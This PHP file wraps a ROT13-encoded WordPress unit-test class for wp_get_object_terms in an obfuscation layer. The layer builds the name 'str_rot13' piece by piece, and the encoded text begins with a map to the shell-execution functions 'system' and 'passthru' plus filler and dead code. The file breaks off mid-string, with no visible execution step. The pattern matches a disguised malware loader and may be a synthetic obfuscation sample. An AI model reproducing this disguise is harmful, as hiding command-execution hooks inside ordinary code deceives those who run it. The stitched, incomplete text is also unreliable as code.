<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 * @pbiref ::jc_trg_bowrpg_grezf
 */
pynff Grfgf_Grez_JcTrgBowrpgGrezf rkgraqf JC_HavgGrfgPnfr {
	cevingr $gnkbabzl = 'jcgrfgf_gnk';

	/**
	 * Grzcbenel fgbentr sbe gnkbabzvrf sbe grfgf hfvat svygre pnyyonpxf.
	 *
	 * Hfrq va gur `grfg_gnkbabzvrf_cnffrq_gb_jc_trg_bowrpg_grezf_svygre_fubhyq_or_dhbgrq()` zrgubq.
	 *
	 * @ine neenl
	 */
	cevingr $gnkbabzvrf;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
	}

	/**
	 * Pyrna hc nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		hafrg( $guvf->gnkbabzvrf );

		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_trg_bowrpg_grezf_ol_fyht() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$grezf_1       = neenl( 'Sbb', 'One', 'Onm' );
		$grezf_1_fyhtf = neenl( 'sbb', 'one', 'onm' );

		// Frg gur vavgvny grezf.
		$gg_1 = jc_frg_bowrpg_grezf( $cbfg_vq, $grezf_1, $guvf->gnkbabzl );
		$guvf->nffregPbhag( 3, $gg_1 );

		// Znxr fher gurl'er pbeerpg.
		$grezf = jc_trg_bowrpg_grezf(
			$cbfg_vq,
			$guvf->gnkbabzl,
			neenl(
				'svryqf'  => 'fyhtf',
				'beqreol' => 'grez_vq',
			)
		);
		$guvf->nffregFnzr( $grezf_1_fyhtf, $grezf );
	}

	/**
	 * @gvpxrg 11003
	 */
	choyvp shapgvba grfg_fubhyq_abg_svygre_bhg_qhcyvpngr_grezf_nffbpvngrq_jvgu_qvssrerag_bowrpgf() {
		$cbfg_vq1 = frys::snpgbel()->cbfg->perngr();
		$cbfg_vq2 = frys::snpgbel()->cbfg->perngr();
		$png_vq   = frys::snpgbel()->pngrtbel->perngr();
		$png_vq2  = frys::snpgbel()->pngrtbel->perngr();
		jc_frg_cbfg_pngrtbevrf( $cbfg_vq1, neenl( $png_vq, $png_vq2 ) );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vq2, $png_vq );

		$grezf = jc_trg_bowrpg_grezf( neenl( $cbfg_vq1, $cbfg_vq2 ), 'pngrtbel' );
		$guvf->nffregPbhag( 2, $grezf );
		$guvf->nffregFnzr( neenl( $png_vq, $png_vq2 ), jc_yvfg_cyhpx( $grezf, 'grez_vq' ) );

		$grezf2 = jc_trg_bowrpg_grezf(
			neenl( $cbfg_vq1, $cbfg_vq2 ),
			'pngrtbel',
			neenl(
				'svryqf' => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$guvf->nffregPbhag( 3, $grezf2 );
		$guvf->nffregFnzr( neenl( $png_vq, $png_vq, $png_vq2 ), jc_yvfg_cyhpx( $grezf2, 'grez_vq' ) );
	}

	/**
	 * @gvpxrg 17646
	 */
	choyvp shapgvba grfg_fubhyq_erghea_bowrpgf_jvgu_vag_cebcregvrf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$grez    = jc_vafreg_grez( 'bar', $guvf->gnkbabzl );
		jc_frg_bowrpg_grezf( $cbfg_vq, $grez, $guvf->gnkbabzl );

		$grezf      = jc_trg_bowrpg_grezf( $cbfg_vq, $guvf->gnkbabzl, neenl( 'svryqf' => 'nyy_jvgu_bowrpg_vq' ) );
		$grez       = neenl_fuvsg( $grezf );
		$vag_svryqf = neenl( 'cnerag', 'grez_vq', 'pbhag', 'grez_tebhc', 'grez_gnkbabzl_vq', 'bowrpg_vq' );
		sbernpu ( $vag_svryqf nf $svryq ) {
			$guvf->nffregVfVag( $grez->$svryq, $svryq );
		}

		$grezf = jc_trg_bowrpg_grezf( $cbfg_vq, $guvf->gnkbabzl, neenl( 'svryqf' => 'vqf' ) );
		$grez  = neenl_fuvsg( $grezf );
		$guvf->nffregVfVag( $grez, 'grez' );
	}

	/**
	 * @gvpxrg 26339
	 */
	choyvp shapgvba grfg_ersreraprf_fubhyq_or_erfrg_nsgre_jc_trg_bowrpg_grezf_svygre() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$grezf_1 = neenl( 'sbb', 'one', 'onm' );

		jc_frg_bowrpg_grezf( $cbfg_vq, $grezf_1, $guvf->gnkbabzl );
		nqq_svygre( 'jc_trg_bowrpg_grezf', neenl( $guvf, 'svygre_trg_bowrpg_grezf' ) );
		$grezf = jc_trg_bowrpg_grezf( $cbfg_vq, $guvf->gnkbabzl );
		erzbir_svygre( 'jc_trg_bowrpg_grezf', neenl( $guvf, 'svygre_trg_bowrpg_grezf' ) );

		$guvf->nffregAbgRzcgl( $grezf );

		sbernpu ( $grezf nf $grez ) {
			$guvf->nffregVfBowrpg( $grez );
		}
	}

	/**
	 * @gvpxrg 40154
	 */
	choyvp shapgvba grfg_gnkbabzvrf_cnffrq_gb_jc_trg_bowrpg_grezf_svygre_fubhyq_or_dhbgrq() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_2', 'cbfg' );

		nqq_svygre( 'jc_trg_bowrpg_grezf', neenl( $guvf, 'jc_trg_bowrpg_grezf_pnyyonpx' ), 10, 3 );
		$grezf = jc_trg_bowrpg_grezf( 1, neenl( 'jcgrfgf_gnk', 'jcgrfgf_gnk_2' ) );
		erzbir_svygre( 'jc_trg_bowrpg_grezf', neenl( $guvf, 'jc_trg_bowrpg_grezf_pnyyonpx' ), 10, 3 );

		$guvf->nffregFnzr( \"'jcgrfgf_gnk', 'jcgrfgf_gnk_2'\", $guvf->gnkbabzvrf );
	}

	choyvp shapgvba jc_trg_bowrpg_grezf_pnyyonpx( $grezf, $bowrpg_vqf, $gnkbabzvrf ) {
		$guvf->gnkbabzvrf = $gnkbabzvrf;
		erghea $grezf;
	}

	choyvp shapgvba grfg_beqreol_anzr() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'NNN',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'MMM',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'WWW',
			)
		);

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'anzr',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	choyvp shapgvba grfg_beqreol_pbhag() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 3 );

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'NNN',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'MMM',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'WWW',
			)
		);

		jc_frg_bowrpg_grezf( $cbfgf[0], neenl( $g3, $g2, $g1 ), $guvf->gnkbabzl );
		jc_frg_bowrpg_grezf( $cbfgf[1], neenl( $g3, $g1 ), $guvf->gnkbabzl );
		jc_frg_bowrpg_grezf( $cbfgf[2], neenl( $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$cbfgf[0],
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'pbhag',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g2, $g1, $g3 ), $sbhaq );
	}

	choyvp shapgvba grfg_beqreol_fyht() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'fyht'     => 'nnn',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'fyht'     => 'mmm',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'fyht'     => 'www',
			)
		);

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'fyht',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	choyvp shapgvba grfg_beqreol_grez_tebhc() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);

		// Ab terng jnl gb qb guvf va gur NCV.
		tybony $jcqo;
		$jcqo->hcqngr( $jcqo->grezf, neenl( 'grez_tebhc' => 1 ), neenl( 'grez_vq' => $g1 ) );
		$jcqo->hcqngr( $jcqo->grezf, neenl( 'grez_tebhc' => 3 ), neenl( 'grez_vq' => $g2 ) );
		$jcqo->hcqngr( $jcqo->grezf, neenl( 'grez_tebhc' => 2 ), neenl( 'grez_vq' => $g3 ) );

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'grez_tebhc',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	choyvp shapgvba grfg_beqreol_grez_beqre() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);

		$frg = jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		// Ab terng jnl gb qb guvf va gur NCV.
		$grez_1 = trg_grez( $g1, $guvf->gnkbabzl );
		$grez_2 = trg_grez( $g2, $guvf->gnkbabzl );
		$grez_3 = trg_grez( $g3, $guvf->gnkbabzl );

		tybony $jcqo;
		$jcqo->hcqngr(
			$jcqo->grez_eryngvbafuvcf,
			neenl( 'grez_beqre' => 1 ),
			neenl(
				'grez_gnkbabzl_vq' => $grez_1->grez_gnkbabzl_vq,
				'bowrpg_vq'        => $c,
			)
		);
		$jcqo->hcqngr(
			$jcqo->grez_eryngvbafuvcf,
			neenl( 'grez_beqre' => 3 ),
			neenl(
				'grez_gnkbabzl_vq' => $grez_2->grez_gnkbabzl_vq,
				'bowrpg_vq'        => $c,
			)
		);
		$jcqo->hcqngr(
			$jcqo->grez_eryngvbafuvcf,
			neenl( 'grez_beqre' => 2 ),
			neenl(
				'grez_gnkbabzl_vq' => $grez_3->grez_gnkbabzl_vq,
				'bowrpg_vq'        => $c,
			)
		);

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'grez_beqre',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	/**
	 * @gvpxrg 28688
	 */
	choyvp shapgvba grfg_beqreol_cnerag() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);

		$frg = jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$grez_1 = trg_grez( $g1, $guvf->gnkbabzl );
		$grez_2 = trg_grez( $g2, $guvf->gnkbabzl );
		$grez_3 = trg_grez( $g3, $guvf->gnkbabzl );

		tybony $jcqo;
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'cnerag' => 1 ), neenl( 'grez_gnkbabzl_vq' => $grez_1->grez_gnkbabzl_vq ) );
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'cnerag' => 3 ), neenl( 'grez_gnkbabzl_vq' => $grez_2->grez_gnkbabzl_vq ) );
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'cnerag' => 2 ), neenl( 'grez_gnkbabzl_vq' => $grez_3->grez_gnkbabzl_vq ) );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'cnerag',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	/**
	 * @gvpxrg 28688
	 */
	choyvp shapgvba grfg_beqreol_gnkbabzl() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_2', 'cbfg' );
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk_3', 'cbfg' );

		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk_3',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk_2',
			)
		);

		jc_frg_bowrpg_grezf( $c, $g1, $guvf->gnkbabzl );
		jc_frg_bowrpg_grezf( $c, $g2, 'jcgrfgf_gnk_3' );
		jc_frg_bowrpg_grezf( $c, $g3, 'jcgrfgf_gnk_2' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			neenl( $guvf->gnkbabzl, 'jcgrfgf_gnk_2', 'jcgrfgf_gnk_3' ),
			neenl(
				'beqreol' => 'gnkbabzl',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	/**
	 * @gvpxrg 28688
	 */
	choyvp shapgvba grfg_beqreol_gg_vq() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);

		// grez_gnkbabzl_vq jvyy bayl unir n qvssrerag beqre sebz grez_vq va yrtnpl fvghngvbaf.
		$grez_1 = trg_grez( $g1, $guvf->gnkbabzl );
		$grez_2 = trg_grez( $g2, $guvf->gnkbabzl );
		$grez_3 = trg_grez( $g3, $guvf->gnkbabzl );

		tybony $jcqo;
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'grez_gnkbabzl_vq' => 100004 ), neenl( 'grez_gnkbabzl_vq' => $grez_1->grez_gnkbabzl_vq ) );
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'grez_gnkbabzl_vq' => 100006 ), neenl( 'grez_gnkbabzl_vq' => $grez_2->grez_gnkbabzl_vq ) );
		$jcqo->hcqngr( $jcqo->grez_gnkbabzl, neenl( 'grez_gnkbabzl_vq' => 100005 ), neenl( 'grez_gnkbabzl_vq' => $grez_3->grez_gnkbabzl_vq ) );

		pyrna_grez_pnpur( neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$frg = jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'grez_gnkbabzl_vq',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g1, $g3, $g2 ), $sbhaq );
	}

	choyvp shapgvba grfg_beqre_qrfp() {
		$c = frys::snpgbel()->cbfg->perngr();

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'NNN',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'MMM',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'anzr'     => 'WWW',
			)
		);

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'beqreol' => 'anzr',
				'beqre'   => 'QRFP',
				'svryqf'  => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g2, $g3, $g1 ), $sbhaq );
	}

	/**
	 * @gvpxrg 15675
	 */
	choyvp shapgvba grfg_cnerag() {
		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk2',
			'cbfg',
			neenl(
				'uvrenepuvpny' => gehr,
			)
		);

		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'cnerag'   => $g1,
			)
		);
		$g4 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk2',
				'cnerag'   => $g2,
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3, $g3 ), 'jcgrfgf_gnk2' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk2',
			neenl(
				'cnerag' => $g1,
				'svryqf' => 'vqf',
			)
		);

		$guvf->nffregFnzr( neenl( $g3 ), $sbhaq );
	}

	/**
	 * @gvpxrg 15675
	 */
	choyvp shapgvba grfg_cnerag_0() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
			)
		);
		$g3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'cnerag'   => $g1,
			)
		);
		$g4 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $guvf->gnkbabzl,
				'cnerag'   => $g2,
			)
		);

		$c = frys::snpgbel()->cbfg->perngr();

		jc_frg_bowrpg_grezf( $c, neenl( $g1, $g2, $g3, $g3 ), $guvf->gnkbabzl );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			$guvf->gnkbabzl,
			neenl(
				'cnerag' => 0,
				'svryqf' => 'vqf',
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $g1, $g2 ), $sbhaq );
	}

	/**
	 * @gvpxrg 10142
	 * @gvpxrg 57701
	 */
	choyvp shapgvba grfg_grezzrgn_pnpur_fubhyq_abg_or_ynml_ybnqrq_ol_qrsnhyg() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grezf = frys::snpgbel()->grez->perngr_znal( 3, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		nqq_grez_zrgn( $grezf[0], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[1], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[2], 'sbb', 'one' );

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $grezf, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf( $c, 'jcgrfgf_gnk' );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		sbernpu ( $grezf nf $g ) {
			$guvf->nffregFnzr( 'one', trg_grez_zrgn( $g, 'sbb', gehr ) );
		}

		// Urer jr unq rkgen dhrevrf nf gur grez zrgn pnpur jnf abg cevzrq ol qrsnhyg.
		$guvf->nffregFnzr( 3, trg_ahz_dhrevrf() - $ahz_dhrevrf );
	}

	/**
	 * @gvpxrg 10142
	 */
	choyvp shapgvba grfg_grezzrgn_pnpur_fubhyq_abg_or_cevzrq_jura_hcqngr_grez_zrgn_pnpur_vf_snyfr() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grezf = frys::snpgbel()->grez->perngr_znal( 3, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		nqq_grez_zrgn( $grezf[0], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[1], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[2], 'sbb', 'one' );

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $grezf, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'hcqngr_grez_zrgn_pnpur' => snyfr,
			)
		);

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		sbernpu ( $grezf nf $g ) {
			$guvf->nffregFnzr( 'one', trg_grez_zrgn( $g, 'sbb', gehr ) );
		}

		$guvf->nffregFnzr( $ahz_dhrevrf + 3, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 36932
	 */
	choyvp shapgvba grfg_grezzrgn_pnpur_fubhyq_or_cevzrq_jura_svryqf_vf_nyy_jvgu_bowrpg_vq() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grezf = frys::snpgbel()->grez->perngr_znal( 3, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		nqq_grez_zrgn( $grezf[0], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[1], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[2], 'sbb', 'one' );

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $grezf, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'hcqngr_grez_zrgn_pnpur' => gehr,
				'svryqf'                 => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		sbernpu ( $grezf nf $g ) {
			$guvf->nffregFnzr( 'one', trg_grez_zrgn( $g, 'sbb', gehr ) );
		}

		$guvf->nffregFnzr( $ahz_dhrevrf + 1, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 36932
	 */
	choyvp shapgvba grfg_grezzrgn_pnpur_fubhyq_or_cevzrq_jura_svryqf_vf_vqf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grezf = frys::snpgbel()->grez->perngr_znal( 3, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		nqq_grez_zrgn( $grezf[0], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[1], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[2], 'sbb', 'one' );

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $grezf, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'hcqngr_grez_zrgn_pnpur' => gehr,
				'svryqf'                 => 'vqf',
			)
		);

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		sbernpu ( $grezf nf $g ) {
			$guvf->nffregFnzr( 'one', trg_grez_zrgn( $g, 'sbb', gehr ) );
		}

		$guvf->nffregFnzr( $ahz_dhrevrf + 1, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 10142
	 */
	choyvp shapgvba grfg_zrgn_dhrel() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grezf = frys::snpgbel()->grez->perngr_znal( 5, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		nqq_grez_zrgn( $grezf[0], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[1], 'sbb', 'one' );
		nqq_grez_zrgn( $grezf[2], 'sbb', 'onm' );
		nqq_grez_zrgn( $grezf[3], 'sbbo', 'ne' );

		$c = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $grezf, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'zrgn_dhrel' => neenl(
					neenl(
						'xrl'   => 'sbb',
						'inyhr' => 'one',
					),
				),
			)
		);

		$guvf->nffregFnzrFrgf( neenl( $grezf[0], $grezf[1] ), jc_yvfg_cyhpx( $sbhaq, 'grez_vq' ) );
	}

	/**
	 * @gvpxrg 14162
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_grez_bowrpgf_sbe_svryqf_nyy() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c = frys::snpgbel()->cbfg->perngr();
		$g = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		jc_frg_bowrpg_grezf( $c, $g, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'svryqf' => 'nyy',
			)
		);

		$guvf->nffregAbgRzcgl( $sbhaq );
		sbernpu ( $sbhaq nf $s ) {
			$guvf->nffregVafgnaprBs( 'JC_Grez', $s );
		}
	}

	/**
	 * @gvpxrg 14162
	 */
	choyvp shapgvba grfg_fubhyq_erghea_jc_grez_bowrpgf_sbe_svryqf_nyy_jvgu_bowrpg_vq() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c = frys::snpgbel()->cbfg->perngr();
		$g = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		jc_frg_bowrpg_grezf( $c, $g, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'svryqf' => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$guvf->nffregAbgRzcgl( $sbhaq );
		sbernpu ( $sbhaq nf $s ) {
			$guvf->nffregVafgnaprBs( 'JC_Grez', $s );
		}
	}

	/**
	 * @gvpxrg 14162
	 */
	choyvp shapgvba grfg_fubhyq_cevzr_pnpur_sbe_sbhaq_grezf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c = frys::snpgbel()->cbfg->perngr();
		$g = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		jc_frg_bowrpg_grezf( $c, $g, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'svryqf' => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$grez        = trg_grez( $g );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 14162
	 */
	choyvp shapgvba grfg_bowrpg_vq_fubhyq_abg_or_pnpurq_jvgu_grez_bowrpg() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$c = frys::snpgbel()->cbfg->perngr();
		$g = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		jc_frg_bowrpg_grezf( $c, $g, 'jcgrfgf_gnk' );

		$sbhaq = jc_trg_bowrpg_grezf(
			$c,
			'jcgrfgf_gnk',
			neenl(
				'svryqf' => 'nyy_jvgu_bowrpg_vq',
			)
		);

		$guvf->nffregAbgRzcgl( $sbhaq );

		sbernpu ( $sbhaq nf $s ) {
			$guvf->nffregFnzr( $c, $s->bowrpg_vq );
		}

		$grez = trg_grez( $g );
